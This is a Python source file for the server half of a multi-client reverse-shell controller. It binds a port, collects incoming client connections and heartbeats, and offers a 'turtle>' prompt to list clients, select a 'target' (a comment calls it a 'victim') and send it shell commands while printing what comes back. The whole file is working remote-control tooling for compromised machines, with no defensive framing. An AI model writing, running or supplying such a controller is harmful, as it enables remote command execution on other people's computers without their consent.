import socket
import sys
import threading
import time
from queue import Queue
import os

NUMBER_OF_THREADS = 3
JOB_NUMBER = [1, 2, 3]
queue = Queue()
all_connections = []
all_address = []
hb_connections = []
hb_address = []

port = int(sys.argv[1])

# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = port if port else 8091
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Handling connection from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted

def accepting_connections():
    # close shell connections
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    # close heartbeat connections
    for c in hb_connections:
        c.close()

    del hb_connections[:]
    del hb_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout
        except:
            print("Error accepting connections")
        try:
            data = conn.recv(1024)
        except:
            print("error in receiving data")

        if data == b' ':
            all_connections.append(conn)
            all_address.append(address)
            print("Connection has been established :" + address[0])
        else:
            print("create hb process", data)
            hb_connections.append(conn)
            hb_address.append(address)




# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands
# turtle> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# turtle> select 1
# 192.168.0.112> dir


def start_turtle():

    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif 'hb' in cmd:
            print(hb_connections)
            #show_client_daemon()
        else:
            print("Command not recognized")

def show_client_daemon():
    for i, conn in enumerate(hb_connections):
        print("client " + str(i) + '')


def hb_test():
    #time.sleep()
    while True:
        for i, conn in enumerate(hb_connections):
            try:
                conn.send(str.encode(' '))
                #conn.recv(20480)
            except:
                print("client " + str(i) + 'lost connection')
                del all_connections[i]
                del hb_connections[i]
                del all_address[i]
                del hb_address[i]
                continue

# Display all current active connections with client

def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

        print("----Clients----" + "\n" + results)


# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
        # 192.168.0.4> dir

    except:
        print("Selection not valid")
        return None


# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'exit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        # set worker as daemon; daemon terminates after main ends
        t.setDaemon(True)
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        if x == 3:
            hb_test()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()